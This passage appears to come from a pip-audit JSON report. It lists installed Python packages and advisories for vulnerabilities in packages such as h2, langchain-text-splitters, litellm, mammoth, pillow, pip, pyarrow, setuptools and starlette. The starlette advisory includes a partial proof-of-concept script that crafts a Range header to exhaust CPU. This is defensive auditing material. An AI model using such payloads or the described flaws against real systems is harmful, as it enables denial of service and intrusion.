Credits  Reported by Jeppe Bonde Weikop on 2025-01-09."}]}, {"name": "h2", "version": "4.2.0", "vulns": [{"id": "GHSA-847f-9342-265h", "fix_versions": ["4.3.0"], "aliases": ["CVE-2025-57804"], "description": "### Summary  HTTP/2 request splitting vulnerability allows attackers to perform request smuggling attacks by injecting CRLF characters into headers. This occurs when servers downgrade HTTP/2 requests to HTTP/1.1 without properly validating header names/values, enabling attackers to manipulate request boundaries and bypass security controls."}]}, {"name": "h5py", "version": "3.12.1", "vulns": []}, {"name": "hf", "version": "0.0.8", "vulns": []}, {"name": "hpack", "version": "4.1.0", "vulns": []}, {"name": "httpcore", "version": "1.0.7", "vulns": []}, {"name": "httplib2", "version": "0.22.0", "vulns": []}, {"name": "httptools", "version": "0.6.4", "vulns": []}, {"name": "httpx", "version": "0.28.1", "vulns": []}, {"name": "httpx-sse", "version": "0.4.0", "vulns": []}, {"name": "huggingface-hub", "version": "1.0.1", "vulns": []}, {"name": "humanfriendly", "version": "10.0", "vulns": []}, {"name": "hyperframe", "version": "6.1.0", "vulns": []}, {"name": "hyperlink", "version": "21.0.0", "vulns": []}, {"name": "identify", "version": "2.6.6", "vulns": []}, {"name": "idna", "version": "3.10", "vulns": []}, {"name": "imageio", "version": "2.37.0", "vulns": []}, {"name": "imagesize", "version": "1.4.1", "vulns": []}, {"name": "immutabledict", "version": "4.2.1", "vulns": []}, {"name": "importlib-metadata", "version": "8.5.0", "vulns": []}, {"name": "importlib-resources", "version": "6.5.2", "vulns": []}, {"name": "incremental", "version": "24.7.2", "vulns": []}, {"name": "iniconfig", "version": "2.0.0", "vulns": []}, {"name": "inquirerpy", "version": "0.3.4", "vulns": []}, {"name": "installer", "version": "0.7.0", "vulns": []}, {"name": "ipython", "version": "8.31.0", "vulns": []}, {"name": "isodate", "version": "0.7.2", "vulns": []}, {"name": "isort", "version": "5.13.2", "vulns": []}, {"name": "isosurfaces", "version": "0.1.2", "vulns": []}, {"name": "itsdangerous", "version": "2.2.0", "vulns": []}, {"name": "jaraco-classes", "version": "3.4.0", "vulns": []}, {"name": "jaraco-context", "version": "6.0.1", "vulns": []}, {"name": "jaraco-functools", "version": "4.2.1", "vulns": []}, {"name": "jax", "version": "0.4.23", "vulns": []}, {"name": "jaxlib", "version": "0.4.23", "vulns": []}, {"name": "jedi", "version": "0.19.2", "vulns": []}, {"name": "jinja2", "version": "3.1.6", "vulns": []}, {"name": "jiter", "version": "0.7.0", "vulns": []}, {"name": "jmespath", "version": "1.0.1", "vulns": []}, {"name": "joblib", "version": "1.4.2", "vulns": []}, {"name": "jsonargparse", "version": "3.13.1", "vulns": []}, {"name": "jsonpatch", "version": "1.33", "vulns": []}, {"name": "jsonpointer", "version": "3.0.0", "vulns": []}, {"name": "jsonschema", "version": "4.23.0", "vulns": []}, {"name": "jsonschema-path", "version": "0.3.4", "vulns": []}, {"name": "jsonschema-specifications", "version": "2024.10.1", "vulns": []}, {"name": "kaggle", "version": "1.6.17", "vulns": []}, {"name": "kagglehub", "version": "0.3.6", "vulns": []}, {"name": "keras-nightly", "version": "3.8.0.dev2025010803", "vulns": []}, {"name": "keras-nlp", "version": "0.0.2", "vulns": []}, {"name": "keyring", "version": "25.6.0", "vulns": []}, {"name": "kiwisolver", "version": "1.4.7", "vulns": []}, {"name": "langchain", "version": "0.3.21", "vulns": []}, {"name": "langchain-anthropic", "version": "0.3.3", "vulns": []}, {"name": "langchain-aws", "version": "0.2.19", "vulns": []}, {"name": "langchain-core", "version": "0.3.49", "vulns": []}, {"name": "langchain-deepseek", "version": "0.1.3", "vulns": []}, {"name": "langchain-google-genai", "version": "2.1.2", "vulns": []}, {"name": "langchain-ollama", "version": "0.3.0", "vulns": []}, {"name": "langchain-openai", "version": "0.3.11", "vulns": []}, {"name": "langchain-text-splitters", "version": "0.3.7", "vulns": [{"id": "GHSA-m42m-m8cr-8m58", "fix_versions": ["0.3.9"], "aliases": ["CVE-2025-6985"], "description": "The HTMLSectionSplitter class in langchain-text-splitters is vulnerable to XML External Entity (XXE) attacks due to unsafe XSLT parsing. This vulnerability arises because the class allows the use of arbitrary XSLT stylesheets, which are parsed using lxml.etree.parse() and lxml.etree.XSLT() without any hardening measures. In lxml versions up to 4.9.x, external entities are resolved by default, allowing attackers to read arbitrary local files or perform outbound HTTP(S) fetches. In lxml versions 5.0 and above, while entity expansion is disabled, the XSLT document() function can still read any URI unless XSLTAccessControl is applied. This vulnerability allows remote attackers to gain read-only access to any file the LangChain process can reach, including sensitive files such as SSH keys, environment files, source code, or cloud metadata. No authentication, special privileges, or user interaction are required, and the issue is exploitable in default deployments that enable custom XSLT."}]}, {"name": "langgraph", "version": "0.3.21", "vulns": []}, {"name": "langgraph-bigtool", "version": "0.0.2", "vulns": []}, {"name": "langgraph-checkpoint", "version": "2.0.23", "vulns": []}, {"name": "langgraph-prebuilt", "version": "0.1.7", "vulns": []}, {"name": "langgraph-sdk", "version": "0.1.60", "vulns": []}, {"name": "langsmith", "version": "0.3.19", "vulns": []}, {"name": "latex", "version": "0.7.0", "vulns": []}, {"name": "lazy-loader", "version": "0.4", "vulns": []}, {"name": "lazy-object-proxy", "version": "1.12.0", "vulns": []}, {"name": "libclang", "version": "18.1.1", "vulns": []}, {"name": "license-expression", "version": "30.4.4", "vulns": []}, {"name": "lightning-utilities", "version": "0.14.3", "vulns": []}, {"name": "linkify-it-py", "version": "2.0.3", "vulns": []}, {"name": "litellm", "version": "1.56.10", "vulns": [{"id": "GHSA-fjcf-3j3r-78rp", "fix_versions": ["1.61.15"], "aliases": ["CVE-2025-0628"], "description": "An improper authorization vulnerability exists in the main-latest version of BerriAI/litellm. When a user with the role 'internal_user_viewer' logs into the application, they are provided with an overly privileged API key. This key can be used to access all the admin functionality of the application, including endpoints such as '/users/list' and '/users/get_users'. This vulnerability allows for privilege escalation within the application, enabling any account to become a PROXY ADMIN."}]}, {"name": "llvmlite", "version": "0.45.1", "vulns": []}, {"name": "locket", "version": "1.0.0", "vulns": []}, {"name": "loguru", "version": "0.7.3", "vulns": []}, {"name": "lxml", "version": "5.3.0", "vulns": []}, {"name": "mammoth", "version": "1.8.0", "vulns": [{"id": "GHSA-rmjr-87wv-gf87", "fix_versions": ["1.11.0"], "aliases": ["CVE-2025-11849"], "description": "Versions of the package mammoth from 0.3.25 and before 1.11.0; versions of the package mammoth from 0.3.25 and before 1.11.0; versions of the package mammoth before 1.11.0; versions of the package org.zwobble.mammoth:mammoth before 1.11.0 are vulnerable to Directory Traversal due to the lack of path or file type validation when processing a docx file containing an image with an external link (r:link attribute instead of embedded r:embed). The library resolves the URI to a file path and after reading, the content is encoded as base64 and included in the HTML output as a data URI. An attacker can read arbitrary files on the system where the conversion is performed or cause an excessive resources consumption by crafting a docx file that links to special device files such as /dev/random or /dev/zero."}]}, {"name": "manim", "version": "0.19.0", "vulns": []}, {"name": "manimpango", "version": "0.6.0", "vulns": []}, {"name": "mapbox-earcut", "version": "1.0.3", "vulns": []}, {"name": "markdown", "version": "3.7", "vulns": []}, {"name": "markdown-it-py", "version": "3.0.0", "vulns": []}, {"name": "markdownify", "version": "1.1.0", "vulns": []}, {"name": "markupsafe", "version": "2.1.5", "vulns": []}, {"name": "matplotlib", "version": "3.10.0", "vulns": []}, {"name": "matplotlib-inline", "version": "0.1.7", "vulns": []}, {"name": "mauve-text", "version": "0.4.0", "vulns": []}, {"name": "mccabe", "version": "0.7.0", "vulns": []}, {"name": "mcp", "version": "1.13.1", "vulns": []}, {"name": "mcp-server-sentry", "version": "2025.1.14", "vulns": []}, {"name": "mdit-py-plugins", "version": "0.5.0", "vulns": []}, {"name": "mdurl", "version": "0.1.2", "vulns": []}, {"name": "mem0ai", "version": "0.1.88", "vulns": []}, {"name": "ml-dtypes", "version": "0.4.1", "vulns": []}, {"name": "modelscope", "version": "1.30.0", "vulns": []}, {"name": "moderngl", "version": "5.12.0", "vulns": []}, {"name": "moderngl-window", "version": "3.0.3", "vulns": []}, {"name": "monotonic", "version": "1.6", "vulns": []}, {"name": "more-itertools", "version": "10.7.0", "vulns": []}, {"name": "mpmath", "version": "1.3.0", "vulns": []}, {"name": "msgpack", "version": "1.1.1", "vulns": []}, {"name": "msrest", "version": "0.7.1", "vulns": []}, {"name": "multidict", "version": "6.1.0", "vulns": []}, {"name": "multiprocess", "version": "0.70.16", "vulns": []}, {"name": "multitasking", "version": "0.0.12", "vulns": []}, {"name": "mypy-extensions", "version": "1.0.0", "vulns": []}, {"name": "namex", "version": "0.0.8", "vulns": []}, {"name": "narwhals", "version": "1.23.0", "vulns": []}, {"name": "nest-asyncio", "version": "1.6.0", "vulns": []}, {"name": "networkx", "version": "3.4.2", "vulns": []}, {"name": "nodeenv", "version": "1.9.1", "vulns": []}, {"name": "notion-client", "version": "2.3.0", "vulns": []}, {"name": "numba", "version": "0.62.1", "vulns": []}, {"name": "numpy", "version": "1.26.4", "vulns": []}, {"name": "oauth2client", "version": "4.1.3", "vulns": []}, {"name": "oauthlib", "version": "3.2.2", "vulns": []}, {"name": "ollama", "version": "0.4.8", "vulns": []}, {"name": "oneshot-grpo", "skip_reason": "Dependency not found on PyPI and could not be audited: oneshot-grpo (0.1.0)"}, {"name": "onnxruntime", "version": "1.23.1", "vulns": []}, {"name": "openai", "version": "1.109.1", "vulns": []}, {"name": "openai-agents", "version": "0.3.3", "vulns": []}, {"name": "openapi-core", "version": "0.19.5", "vulns": []}, {"name": "openapi-pydantic", "version": "0.5.1", "vulns": []}, {"name": "openapi-schema-validator", "version": "0.6.3", "vulns": []}, {"name": "openapi-spec-validator", "version": "0.7.2", "vulns": []}, {"name": "opencv-contrib-python", "version": "4.10.0.84", "vulns": []}, {"name": "opencv-python", "version": "4.11.0.86", "vulns": []}, {"name": "opencv-python-headless", "version": "4.11.0.86", "vulns": []}, {"name": "openpyxl", "version": "3.1.5", "vulns": []}, {"name": "opentelemetry-api", "version": "1.31.1", "vulns": []}, {"name": "opentelemetry-exporter-gcp-trace", "version": "1.9.0", "vulns": []}, {"name": "opentelemetry-resourcedetector-gcp", "version": "1.9.0a0", "vulns": []}, {"name": "opentelemetry-sdk", "version": "1.31.1", "vulns": []}, {"name": "opentelemetry-semantic-conventions", "version": "0.52b1", "vulns": []}, {"name": "opt-einsum", "version": "3.4.0", "vulns": []}, {"name": "optax", "version": "0.1.7", "vulns": []}, {"name": "optree", "version": "0.13.1", "vulns": []}, {"name": "orbax-checkpoint", "version": "0.1.6", "vulns": []}, {"name": "orjson", "version": "3.10.16", "vulns": []}, {"name": "ormsgpack", "version": "1.9.1", "vulns": []}, {"name": "outcome", "version": "1.3.0.post0", "vulns": []}, {"name": "packageurl-python", "version": "0.17.5", "vulns": []}, {"name": "packaging", "version": "24.2", "vulns": []}, {"name": "paddleocr", "version": "3.2.0", "vulns": []}, {"name": "paddlex", "version": "3.2.1", "vulns": []}, {"name": "pandas", "version": "2.2.3", "vulns": []}, {"name": "param", "version": "2.2.0", "vulns": []}, {"name": "parse", "version": "1.20.2", "vulns": []}, {"name": "parso", "version": "0.8.4", "vulns": []}, {"name": "partd", "version": "1.4.2", "vulns": []}, {"name": "patchright", "version": "1.51.3", "vulns": []}, {"name": "pathable", "version": "0.4.4", "vulns": []}, {"name": "pathspec", "version": "0.12.1", "vulns": []}, {"name": "pathvalidate", "version": "3.2.1", "vulns": []}, {"name": "pbs-installer", "version": "2025.7.2", "vulns": []}, {"name": "pdf2image", "version": "1.17.0", "vulns": []}, {"name": "pdfminer-six", "version": "20250506", "vulns": []}, {"name": "pdfplumber", "version": "0.11.7", "vulns": []}, {"name": "peewee", "version": "3.18.2", "vulns": []}, {"name": "peft", "version": "0.10.0", "vulns": []}, {"name": "pfzy", "version": "0.3.4", "vulns": []}, {"name": "pillow", "version": "9.5.0", "vulns": [{"id": "PYSEC-2023-175", "fix_versions": ["10.0.1"], "aliases": [], "description": "Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2."}, {"id": "PYSEC-2023-227", "fix_versions": ["10.0.0"], "aliases": ["CVE-2023-44271"], "description": "An issue was discovered in Pillow before 10.0.0. It is a Denial of Service that uncontrollably allocates memory to process a given task, potentially causing a service to crash by having it run out of memory. This occurs for truetype in ImageFont when textlength in an ImageDraw instance operates on a long text argument."}, {"id": "GHSA-3f63-hfp8-52jq", "fix_versions": ["10.2.0"], "aliases": ["CVE-2023-50447"], "description": "Pillow through 10.1.0 allows PIL.ImageMath.eval Arbitrary Code Execution via the environment parameter, a different vulnerability than CVE-2022-22817 (which was about the expression parameter)."}, {"id": "GHSA-j7hp-h8jx-5ppr", "fix_versions": ["10.0.1"], "aliases": ["CVE-2023-4863"], "description": "Heap buffer overflow in libwebp allow a remote attacker to perform an out of bounds memory write via a crafted HTML page."}, {"id": "GHSA-44wm-f244-xhp3", "fix_versions": ["10.3.0"], "aliases": ["CVE-2024-28219"], "description": "In _imagingcms.c in Pillow before 10.3.0, a buffer overflow exists because strcpy is used instead of strncpy."}]}, {"name": "pinecone", "version": "7.3.0", "vulns": []}, {"name": "pinecone-client", "version": "6.0.0", "vulns": []}, {"name": "pinecone-plugin-assistant", "version": "1.8.0", "vulns": []}, {"name": "pinecone-plugin-interface", "version": "0.0.7", "vulns": []}, {"name": "pip", "version": "25.2", "vulns": [{"id": "GHSA-4xh5-x5gv-qwph", "fix_versions": ["25.3"], "aliases": ["CVE-2025-8869"], "description": "### Summary  In the fallback extraction path for source distributions, `pip` used Python\u2019s `tarfile` module without verifying that symbolic/hard link targets resolve inside the intended extraction directory. A malicious sdist can include links that escape the target directory and overwrite arbitrary files on the invoking host during `pip install`.  ### Impact  Successful exploitation enables arbitrary file overwrite outside the build/extraction directory on the machine running `pip`. This can be leveraged to tamper with configuration or startup files and may lead to further code execution depending on the environment, but the direct, guaranteed impact is integrity compromise on the vulnerable system.  ### Conditions  The issue is triggered when installing an attacker-controlled sdist (e.g., from an index or URL) and the fallback extraction code path is used. No special privileges are required beyond running `pip install`; active user action is necessary.  ### Remediation  The [fix](https://github.com/pypa/pip/pull/13550) is available starting in pip `25.3`. Using a Python interpreter that implements the safe-extraction behavior described by **PEP 706** provides additional defense in depth for other `tarfile` issues but is not a substitute for upgrading pip for this specific flaw."}]}, {"name": "pip-api", "version": "0.0.34", "vulns": []}, {"name": "pip-audit", "version": "2.9.0", "vulns": []}, {"name": "pip-requirements-parser", "version": "32.0.1", "vulns": []}, {"name": "pkginfo", "version": "1.12.1.2", "vulns": []}, {"name": "platformdirs", "version": "4.3.6", "vulns": []}, {"name": "playwright", "version": "1.51.0", "vulns": []}, {"name": "plotly", "version": "6.3.1", "vulns": []}, {"name": "pluggy", "version": "1.5.0", "vulns": []}, {"name": "ply", "version": "3.11", "vulns": []}, {"name": "pocketflow", "version": "0.0.2", "vulns": []}, {"name": "poetry", "version": "2.1.3", "vulns": []}, {"name": "poetry-core", "version": "2.1.3", "vulns": []}, {"name": "portalocker", "version": "2.10.1", "vulns": []}, {"name": "postgrest", "version": "1.0.1", "vulns": []}, {"name": "posthog", "version": "3.25.0", "vulns": []}, {"name": "pre-commit", "version": "4.1.0", "vulns": []}, {"name": "prettytable", "version": "3.16.0", "vulns": []}, {"name": "primp", "version": "0.9.3", "vulns": []}, {"name": "prometheus-client", "version": "0.22.0", "vulns": []}, {"name": "promise", "version": "2.3", "vulns": []}, {"name": "prompt-toolkit", "version": "3.0.50", "vulns": []}, {"name": "propcache", "version": "0.2.1", "vulns": []}, {"name": "proto-plus", "version": "1.25.0", "vulns": []}, {"name": "protobuf", "version": "5.29.4", "vulns": [{"id": "GHSA-8qvm-5x2c-j2w7", "fix_versions": ["4.25.8", "5.29.5", "6.31.1"], "aliases": ["CVE-2025-4565"], "description": "### Summary Any project that uses Protobuf pure-Python backend to parse untrusted Protocol Buffers data containing an arbitrary number of **recursive groups**, **recursive messages** or **a series of [`SGROUP`](https://protobuf.dev/programming-guides/encoding/#groups) tags** can be corrupted by exceeding the Python recursion limit.  Reporter: Alexis Challande, Trail of Bits Ecosystem Security Team [ecosystem@trailofbits.com](mailto:ecosystem@trailofbits.com)  Affected versions: This issue only affects the [pure-Python implementation](https://github.com/protocolbuffers/protobuf/tree/main/python#implementation-backends) of protobuf-python backend. This is the implementation when `PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION=python` environment variable is set or the default when protobuf is used from Bazel or pure-Python PyPi wheels. CPython PyPi wheels do not use pure-Python by default.  This is a Python variant of a [previous issue affecting protobuf-java](https://github.com/protocolbuffers/protobuf/security/advisories/GHSA-735f-pc8j-v9w8).  ### Severity This is a potential Denial of Service. Parsing nested protobuf data creates unbounded recursions that can be abused by an attacker.  ### Proof of Concept For reproduction details, please refer to the unit tests [decoder_test.py](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/decoder_test.py#L87-L98) and [message_test](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/message_test.py#L1436-L1478)  ### Remediation and Mitigation A mitigation is available now. Please update to the latest available versions of the following packages: * protobuf-python(4.25.8, 5.29.5, 6.31.1)"}]}, {"name": "psutil", "version": "7.0.0", "vulns": []}, {"name": "psycopg2-binary", "version": "2.9.10", "vulns": []}, {"name": "pure-eval", "version": "0.2.3", "vulns": []}, {"name": "puremagic", "version": "1.28", "vulns": []}, {"name": "py-cpuinfo", "version": "9.0.0", "vulns": []}, {"name": "py-serializable", "version": "2.1.0", "vulns": []}, {"name": "pyarrow", "version": "16.1.0", "vulns": [{"id": "PYSEC-2024-161", "fix_versions": ["17.0.0"], "aliases": ["CVE-2024-52338"], "description": "Deserialization of untrusted data in IPC and Parquet readers in the Apache Arrow R package versions\u00a04.0.0 through 16.1.0 allows arbitrary code execution. An application is vulnerable if it  reads Arrow IPC, Feather or Parquet data from untrusted sources (for  example, user-supplied input files). This vulnerability only affects the arrow R package, not other Apache Arrow  implementations or bindings unless those bindings are specifically used via the R package (for example, an R application that embeds a Python interpreter and uses PyArrow to read files from untrusted sources is still vulnerable if the arrow R package is an affected version). It is recommended that users of the arrow R package upgrade to 17.0.0 or later. Similarly, it  is recommended that downstream libraries upgrade their dependency  requirements to arrow 17.0.0 or later. If using an affected version of the package, untrusted data can read into a Table and its internal to_data_frame() method can be used as a workaround (e.g., read_parquet(..., as_data_frame = FALSE)$to_data_frame()).   This issue affects the Apache Arrow R package: from 4.0.0 through 16.1.0.   Users are recommended to upgrade to version 17.0.0, which fixes the issue."}]}, {"name": "pyasn1", "version": "0.6.1", "vulns": []}, {"name": "pyasn1-modules", "version": "0.4.1", "vulns": []}, {"name": "pyautogen", "version": "0.3.1", "vulns": []}, {"name": "pycairo", "version": "1.27.0", "vulns": []}, {"name": "pyclipper", "version": "1.3.0.post6", "vulns": []}, {"name": "pycodestyle", "version": "2.11.1", "vulns": []}, {"name": "pycparser", "version": "2.22", "vulns": []}, {"name": "pycryptodome", "version": "3.23.0", "vulns": []}, {"name": "pydantic", "version": "2.11.10", "vulns": []}, {"name": "pydantic-core", "version": "2.33.2", "vulns": []}, {"name": "pydantic-settings", "version": "2.8.1", "vulns": []}, {"name": "pydeck", "version": "0.9.1", "vulns": []}, {"name": "pydub", "version": "0.25.1", "vulns": []}, {"name": "pyee", "version": "12.0.0", "vulns": []}, {"name": "pyflakes", "version": "3.1.0", "vulns": []}, {"name": "pygithub", "version": "2.5.0", "vulns": []}, {"name": "pyglet", "version": "2.1.0", "vulns": []}, {"name": "pyglm", "version": "2.7.3", "vulns": []}, {"name": "pygments", "version": "2.19.2", "vulns": []}, {"name": "pyjwt", "version": "2.10.1", "vulns": []}, {"name": "pylerc", "version": "4.0", "vulns": []}, {"name": "pymupdf", "version": "1.26.0", "vulns": []}, {"name": "pynacl", "version": "1.5.0", "vulns": []}, {"name": "pynndescent", "version": "0.5.13", "vulns": []}, {"name": "pyogrio", "version": "0.11.0", "vulns": []}, {"name": "pyparsing", "version": "3.2.0", "vulns": []}, {"name": "pypdf", "version": "6.1.1", "vulns": [{"id": "GHSA-vr63-x8vc-m265", "fix_versions": ["6.1.3"], "aliases": ["CVE-2025-62707"], "description": "### Impact  An attacker who uses this vulnerability can craft a PDF which leads to an infinite loop. This requires parsing the content stream of a page which has an inline image using the DCTDecode filter.  ### Patches This has been fixed in [pypdf==6.1.3](https://github.com/py-pdf/pypdf/releases/tag/6.1.3).  ### Workarounds If you cannot upgrade yet, consider applying the changes from PR [#3501](https://github.com/py-pdf/pypdf/pull/3501)."}, {"id": "GHSA-jfx9-29x2-rv3j", "fix_versions": ["6.1.3"], "aliases": ["CVE-2025-62708"], "description": "### Impact  An attacker who uses this vulnerability can craft a PDF which leads to large memory usage. This requires parsing the content stream of a page using the LZWDecode filter.  ### Patches This has been fixed in [pypdf==6.1.3](https://github.com/py-pdf/pypdf/releases/tag/6.1.3).  ### Workarounds If you cannot upgrade yet, consider applying the changes from PR [#3502](https://github.com/py-pdf/pypdf/pull/3502)."}]}, {"name": "pypdf2", "version": "3.0.1", "vulns": []}, {"name": "pypdfium2", "version": "4.30.0", "vulns": []}, {"name": "pyperclip", "version": "1.9.0", "vulns": []}, {"name": "pyproj", "version": "3.7.1", "vulns": []}, {"name": "pyproject-hooks", "version": "1.2.0", "vulns": []}, {"name": "pyreadline3", "version": "3.5.4", "vulns": []}, {"name": "pysnmp", "version": "7.1.15", "vulns": []}, {"name": "pysocks", "version": "1.7.1", "vulns": []}, {"name": "pyspnego", "version": "0.11.2", "vulns": []}, {"name": "pytesseract", "version": "0.3.10", "vulns": []}, {"name": "pytest", "version": "8.4.2", "vulns": []}, {"name": "pytest-asyncio", "version": "1.0.0", "vulns": []}, {"name": "pytest-mock", "version": "3.14.0", "vulns": []}, {"name": "python-dateutil", "version": "2.9.0.post0", "vulns": []}, {"name": "python-dotenv", "version": "1.1.1", "vulns": []}, {"name": "python-frontmatter", "version": "1.1.0", "vulns": []}, {"name": "python-multipart", "version": "0.0.20", "vulns": []}, {"name": "python-pptx", "version": "1.0.2", "vulns": []}, {"name": "python-slugify", "version": "8.0.4", "vulns": []}, {"name": "pytorch-lightning", "version": "2.5.1.post0", "vulns": []}, {"name": "pytz", "version": "2025.2", "vulns": []}, {"name": "pywin32", "version": "311", "vulns": []}, {"name": "pywin32-ctypes", "version": "0.2.3", "vulns": []}, {"name": "pyyaml", "version": "6.0.2", "vulns": []}, {"name": "qdrant-client", "version": "1.14.2", "vulns": []}, {"name": "rapidfuzz", "version": "3.13.0", "vulns": []}, {"name": "rasterio", "version": "1.4.3", "vulns": []}, {"name": "realtime", "version": "2.4.3", "vulns": []}, {"name": "referencing", "version": "0.35.1", "vulns": []}, {"name": "regex", "version": "2024.11.6", "vulns": []}, {"name": "replicate", "version": "1.0.4", "vulns": []}, {"name": "requests", "version": "2.32.5", "vulns": []}, {"name": "requests-oauthlib", "version": "2.0.0", "vulns": []}, {"name": "requests-toolbelt", "version": "1.0.0", "vulns": []}, {"name": "rfc3339-validator", "version": "0.1.4", "vulns": []}, {"name": "rich", "version": "13.9.4", "vulns": []}, {"name": "rich-rst", "version": "1.3.1", "vulns": []}, {"name": "rpds-py", "version": "0.22.3", "vulns": []}, {"name": "rsa", "version": "4.9", "vulns": []}, {"name": "ruamel-yaml", "version": "0.18.15", "vulns": []}, {"name": "ruamel-yaml-clib", "version": "0.2.12", "vulns": []}, {"name": "ruff", "version": "0.11.7", "vulns": []}, {"name": "s3transfer", "version": "0.12.0", "vulns": []}, {"name": "sacrebleu", "version": "2.5.1", "vulns": []}, {"name": "safehttpx", "version": "0.1.6", "vulns": []}, {"name": "safetensors", "version": "0.4.5", "vulns": []}, {"name": "schedule", "version": "1.2.0", "vulns": []}, {"name": "scikit-image", "version": "0.23.2", "vulns": []}, {"name": "scikit-learn", "version": "1.6.1", "vulns": []}, {"name": "scipy", "version": "1.15.0", "vulns": []}, {"name": "screeninfo", "version": "0.8.1", "vulns": []}, {"name": "selenium", "version": "4.27.1", "vulns": []}, {"name": "semantic-version", "version": "2.10.0", "vulns": []}, {"name": "sentencepiece", "version": "0.2.0", "vulns": []}, {"name": "sentry-sdk", "version": "2.25.1", "vulns": []}, {"name": "setproctitle", "version": "1.3.5", "vulns": []}, {"name": "setuptools", "version": "75.6.0", "vulns": [{"id": "PYSEC-2025-49", "fix_versions": ["78.1.1"], "aliases": ["GHSA-5rjg-fvgr-3xxf", "CVE-2025-47273"], "description": "setuptools is a package that allows users to download, build, install, upgrade, and uninstall Python packages. A path traversal vulnerability in `PackageIndex` is present in setuptools prior to version 78.1.1. An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to remote code execution depending on the context. Version 78.1.1 fixes the issue."}]}, {"name": "sgmllib3k", "version": "1.0.0", "vulns": []}, {"name": "shapely", "version": "2.0.6", "vulns": []}, {"name": "shellingham", "version": "1.5.4", "vulns": []}, {"name": "shtab", "version": "1.7.2", "vulns": []}, {"name": "shutilwhich", "version": "1.1.0", "vulns": []}, {"name": "simple-parsing", "version": "0.1.6", "vulns": []}, {"name": "simplekml", "version": "1.3.6", "vulns": []}, {"name": "six", "version": "1.17.0", "vulns": []}, {"name": "skia-pathops", "version": "0.8.0.post2", "vulns": []}, {"name": "slack-sdk", "version": "3.36.0", "vulns": []}, {"name": "smmap", "version": "5.0.1", "vulns": []}, {"name": "sniffio", "version": "1.3.1", "vulns": []}, {"name": "sortedcontainers", "version": "2.4.0", "vulns": []}, {"name": "soupsieve", "version": "2.6", "vulns": []}, {"name": "speechrecognition", "version": "3.11.0", "vulns": []}, {"name": "sqlalchemy", "version": "2.0.40", "vulns": []}, {"name": "srt", "version": "3.5.3", "vulns": []}, {"name": "sse-starlette", "version": "2.2.1", "vulns": []}, {"name": "sseclient-py", "version": "1.8.0", "vulns": []}, {"name": "sspilib", "version": "0.3.1", "vulns": []}, {"name": "stability-sdk", "version": "0.8.6", "vulns": []}, {"name": "stack-data", "version": "0.6.3", "vulns": []}, {"name": "starlette", "version": "0.41.3", "vulns": [{"id": "GHSA-2c2j-9gv5-cj73", "fix_versions": ["0.47.2"], "aliases": ["CVE-2025-54121"], "description": "### Summary When parsing a multi-part form with large files (greater than the [default max spool size](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/formparsers.py#L126)) `starlette` will block the main thread to roll the file over to disk. This blocks the event thread which means we can't accept new connections.  ### Details Please see this discussion for details: https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403. In summary the following UploadFile code (copied from [here](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/datastructures.py#L436C5-L447C14)) has a minor bug. Instead of just checking for `self._in_memory` we should also check if the additional bytes will cause a rollover.  ```python      @property     def _in_memory(self) -> bool:         # check for SpooledTemporaryFile._rolled         rolled_to_disk = getattr(self.file, \"_rolled\", True)         return not rolled_to_disk      async def write(self, data: bytes) -> None:         if self.size is not None:             self.size += len(data)          if self._in_memory:             self.file.write(data)         else:             await run_in_threadpool(self.file.write, data) ```  I have already created a PR which fixes the problem: https://github.com/encode/starlette/pull/2962   ### PoC See the discussion [here](https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403) for steps on how to reproduce.  ### Impact To be honest, very low and not many users will be impacted. Parsing large forms is already CPU intensive so the additional IO block doesn't slow down `starlette` that much on systems with modern HDDs/SSDs. If someone is running on tape they might see a greater impact."}, {"id": "GHSA-7f5h-v6xp-fcq8", "fix_versions": ["0.49.1"], "aliases": ["CVE-2025-62727"], "description": "### Summary An unauthenticated attacker can send a crafted HTTP Range header that triggers quadratic-time processing in Starlette's `FileResponse` Range parsing/merging logic. This enables CPU exhaustion per request, causing denial\u2011of\u2011service for endpoints serving files (e.g., `StaticFiles` or any use of `FileResponse`).  ### Details Starlette parses multi-range requests in ``FileResponse._parse_range_header()``, then merges ranges using an O(n^2) algorithm.  ```python # starlette/responses.py _RANGE_PATTERN = re.compile(r\"(\\d*)-(\\d*)\") # vulnerable to O(n^2) complexity ReDoS  class FileResponse(Response):     @staticmethod     def _parse_range_header(http_range: str, file_size: int) -> list[tuple[int, int]]:         ranges: list[tuple[int, int]] = []         try:             units, range_ = http_range.split(\"=\", 1)         except ValueError:             raise MalformedRangeHeader()          # [...]          ranges = [             (                 int(_[0]) if _[0] else file_size - int(_[1]),                 int(_[1]) + 1 if _[0] and _[1] and int(_[1]) < file_size else file_size,             )             for _ in _RANGE_PATTERN.findall(range_) # vulnerable             if _ != (\"\", \"\")         ]  ```  The parsing loop of ``FileResponse._parse_range_header()`` uses the regular expression which vulnerable to denial of service for its O(n^2) complexity. A crafted `Range` header can maximize its complexity.  The merge loop processes each input range by scanning the entire result list, yielding quadratic behavior with many disjoint ranges. A crafted Range header with many small, non-overlapping ranges (or specially shaped numeric substrings) maximizes comparisons.    This affects any Starlette application that uses:    - ``starlette.staticfiles.StaticFiles`` (internally returns `FileResponse`) \u2014 `starlette/staticfiles.py:178`   - Direct ``starlette.responses.FileResponse`` responses  ### PoC ```python #!/usr/bin/env python3  import sys import time  try:     import starlette     from starlette.responses import FileResponse except Exception as e:     print(f\"[ERROR] Failed to import starlette: {e}\")     sys.exit(1)   def build_payload(length: int) -> str:     \"\"\"Build the Range header value body: '0' * num_zeros + '0-'\"\"\"     return (\"0\" * length) + \"a-\"   def test(header: str, file_size: int) -> float:     start = time.perf_counter()     try:         FileResponse._parse_range_header(header, file_size)     except Exception:         pass     end = time.perf_counter()     elapsed = end - start     return elapsed   def run_once(num_zeros: int) -> None:     range_body = build_payload(num_zeros)     header = \"bytes=\" + range_body     # Use a sufficiently large file_size so upper bounds default to file size     file_size = max(len(range_body) + 10, 